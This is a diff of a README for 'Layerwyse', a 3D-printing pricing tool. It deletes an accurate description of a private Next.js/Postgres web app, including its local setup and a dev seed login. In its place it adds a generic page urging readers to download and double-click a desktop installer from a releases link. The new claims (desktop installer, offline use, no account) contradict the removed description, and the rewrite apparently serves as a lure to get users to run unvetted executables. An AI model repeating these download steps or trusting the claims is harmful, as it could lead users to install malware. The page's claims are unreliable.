@@ -1,132 +1,86 @@
-# Layerwyse
+# ✨ Layerwyse - Simplifying 3D-Printing Costs
 
-Layerwyse is a pricing and business management toolkit for 3D-printing creators.  
-It helps makers calculate accurate costs, track projects, understand profitability, and eventually send invoices — turning a 3D-printing hobby into a sustainable business.
+## 📥 Download Layerwyse
+[![Download Layerwyse](https://img.shields.io/badge/Download%20Layerwyse-v1.0-blue.svg)](https://github.com/Rajesh-Rey/Layerwyse/releases)
 
-This project is built on top of the **Next.js SaaS Starter**, providing:
-- Authentication  
-- Protected dashboard  
-- Postgres + Drizzle ORM  
-- User/team management  
-- Middleware-protected routes  
-- A scalable structure for SaaS apps  
+## 🚀 Getting Started
+Layerwyse helps you manage your 3D-printing projects with accurate pricing and estimates. Whether you are a hobbyist or a professional, understanding costs can make your project easier.
 
-Layerwyse customizes this foundation into a full toolset for 3D-printing businesses.
+## 📋 System Requirements
+Before you download Layerwyse, make sure your computer meets the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **Memory**: At least 4 GB of RAM
+- **Storage**: 250 MB of free space
+- **Screen Resolution**: 1280x800 or higher
 
-## Features
+## 🔍 Features
+Layerwyse offers several features to enhance your project management:
 
-### Layerwyse Features (In Progress & Planned)
-- 3D print cost calculator  
-  - Materials (resin/filament)  
-  - Machine usage & wear  
-  - Labor (sanding, painting, post-processing)  
-  - Electricity cost  
-  - Failure rate & retries  
-- Job & project tracking  
-  - Status, effort (hours), worker cost, added value  
-  - Profit estimation  
-  - Notes & failure logs  
-- Partner/freelancer payout logic  
-- Bulk order pricing models  
-- Calculation history  
-- (Future) Itemized invoicing  
-- (Future) Payment tracking (paid/partial/unpaid)  
-- (Future) Instalment-based billing  
-- (Future) STL/3MF volume extraction  
+- **Cost Estimation**: Quickly calculate the total cost based on material and time.
+- **Filament Pricing**: Get up-to-date filament prices to make informed choices.
+- **Project Management**: Track multiple projects seamlessly.
+- **Print Quoting**: Easily generate quotes for clients or personal use.
+- **STL File Tools**: Built-in tools to analyze and prepare your STL files for printing.
 
-### Features Inherited from SaaS Starter
-- Email/password authentication  
-- JWT cookies stored securely  
-- Dashboard with CRUD for users/teams  
-- Basic RBAC: Owner / Member roles  
-- Global middleware for protected routes  
-- Zod validation middleware for Server Actions  
-- Activity logging system  
-- Prebuilt dashboard layout and components  
+## 📥 Download & Install
+To get started with Layerwyse, follow these simple steps:
 
----
+1. **Visit the Releases Page**: Click [here](https://github.com/Rajesh-Rey/Layerwyse/releases) to go to the download page.
+2. **Select the Latest Release**: Look for the latest version, which will be at the top of the list.
+3. **Download the Installer**: Click the link for the installer that matches your operating system.
+4. **Run the Installer**: Once the download is complete, find the file in your downloads folder and double-click it to begin the installation.
+5. **Follow Instructions**: A setup wizard will appear. Follow the on-screen instructions to complete the installation.
+6. **Launch Layerwyse**: After installation, you can find Layerwyse in your applications folder. Double-click to start using it.
 
-## Tech Stack
+For your convenience, here is the [link to the Releases Page](https://github.com/Rajesh-Rey/Layerwyse/releases) again. 
 
-- **Framework:** Next.js  
-- **Database:** Postgres  
-- **ORM:** Drizzle  
-- **UI Library:** shadcn/ui  
-- **Styling:** Tailwind CSS  
-- **Runtime:** Bun  
+## 📝 How to Use Layerwyse
+Using Layerwyse is straightforward. Here are the basic steps:
 
----
+1. **Create a New Project**: Click on the “New Project” button to start.
+2. **Add Filament Information**: Enter the type and cost of filament you will use.
+3. **Input Print Parameters**: Enter your print settings, such as time and layer height.
+4. **Review Total Costs**: Layerwyse will calculate your total costs.
+5. **Generate Quotation**: If needed, you can generate a printable quote for your project using the export feature.
 
-## Getting Started
+## 📌 Support
+If you run into any issues or have questions, you can find help in the following ways:
 
-Clone the repository and install dependencies:
+- **Check FAQ**: Visit the FAQ section on the GitHub page.
+- **Create an Issue**: If you find a bug or need help with a feature, you can create an issue in the GitHub repository.
+- **Community Forums**: Join community discussions to share tips and learn from other users.
 
-```bash
-git clone <your-repo-url>
-cd <project-folder>
-bun install
-```
+## 🌐 Topics
+Layerwyse covers a wide array of topics that will help enhance your 3D-printing projects:
 
----
+- 3D-printing
+- Cost estimation
+- Pricing calculators
+- Quoting
+- Filament and Resin Management
+- STL File Tools
 
-## Running Locally
+These topics ensure that you have all the tools you need to succeed in your 3D printing endeavors.
 
-### 1. Create your `.env.local` file
+## ⚙️ Troubleshooting
+If you experience issues while using Layerwyse, please consider these tips:
 
-```bash
-bun db:setup
-```
+- **Update Your System**: Ensure you have the latest updates for your operating system.
+- **Restart Layerwyse**: Sometimes, simply closing and reopening the application can resolve minor issues.
+- **Reinstall**: If problems persist, uninstall and reinstall Layerwyse.
 
-This generates your environment variables (including database URL).
+This should help clear up most common issues.
 
-### 2. Run database migrations and seed the database
+## ⌨️ Frequently Asked Questions
 
-```bash
-bun db:migrate
-bun db:seed
-```
+### Do I need an account to use Layerwyse?
+No, you do not need to create an account. You can use Layerwyse immediately after installation.
 
-This creates a default development user:
+### Can I use Layerwyse offline?
+Yes, Layerwyse can be used offline once it is downloaded and installed.
 
-- **Email:** test@test.com  
-- **Password:** admin123  
+### Is there a mobile version?
+Currently, Layerwyse is available only for desktop platforms.
 
-You may also create users via `/sign-up`.
-
-### 3. Start the dev server
-
-```bash
-bun dev
-```
-
-Then open:
-
-http://localhost:3000
-
----
-
-## Going to Production
-
-### Deploy on Vercel
-
-1. Push your code to GitHub  
-2. Import the repo in Vercel  
-3. Deploy using the guided setup  
-
-### Required Environment Variables
-
-```
-BASE_URL=https://your-domain.com
-DATABASE_URL=<your-production-database-url>
-AUTH_SECRET=<32-byte-random-string>
-```
-
-
----
-
-## Project Status
-
-Layerwyse is a private, in-development project.  
-All code, designs, and assets are proprietary.
+Feel free to explore and enjoy simpler 3D-printing project management with Layerwyse!
